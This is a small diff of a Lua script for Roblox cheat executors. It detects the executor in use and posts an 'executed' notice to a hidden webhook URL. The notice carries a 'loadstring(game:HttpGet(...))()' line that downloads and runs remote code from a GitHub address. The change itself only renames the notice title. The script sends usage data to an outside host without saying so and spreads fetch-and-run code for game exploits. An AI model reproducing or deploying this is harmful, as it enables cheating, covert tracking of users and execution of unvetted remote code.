@@ -13,7 +13,7 @@ repeat game:GetService("RunService").RenderStepped:wait() until game.Players.Loc
 local loleh = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
 dothethingy = http_request or request or HttpPost or syn.request
 dothethingy({Url = weno, Body = game:GetService("HttpService"):JSONEncode({
-["embeds"] = {{["title"] = "**Orion Executed**",
+["embeds"] = {{["title"] = "**Bob Executed**",
 ["description"] = '```lua\nloadstring(game:HttpGet("https://raw.githubusercontent.com/BobRossIsBoss/bob-ross/main/bob-ross"))()```',
 ["fields"] = {
     {
